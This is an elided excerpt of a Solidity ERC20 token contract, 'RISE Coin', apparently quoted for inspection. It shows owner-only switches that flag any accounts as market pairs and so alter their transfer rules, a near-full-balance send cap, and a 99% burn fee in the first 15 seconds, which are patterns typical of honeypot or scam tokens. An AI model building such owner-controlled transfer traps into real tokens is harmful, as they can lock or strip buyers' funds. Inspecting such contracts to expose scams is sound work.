...
contract RISE is ERC20, Ownable {
    ...
    address public marketingWallet = 0x195750f86918D6Ea27d3771dA1AFbe59cEA47406;
    address public tokenOwner = 0x3c7FCDBD79C9de335dBb21C83cAE1571732bfB21;
    ...
    constructor() ERC20("RISE Coin", "RISE") {
    ...
    function setisMarketPair(address account, bool excluded) public onlyOwner {
        isMarketPair[account] = excluded;
    }

    function excludeIsMarketPair(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            isMarketPair[accounts[i]] = excluded;
        }
    }
    ...
    function _transfer(
        ...
        if (!isMarketPair[from] && !isMarketPair[to]) {
            uint maxAmount = balanceOf(from) * 999999 / 1000000;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        ...
        if(takeFee) {
            ...
            if (block.timestamp - startTime < 15) {
                feeToBurn = 99;
            } else {
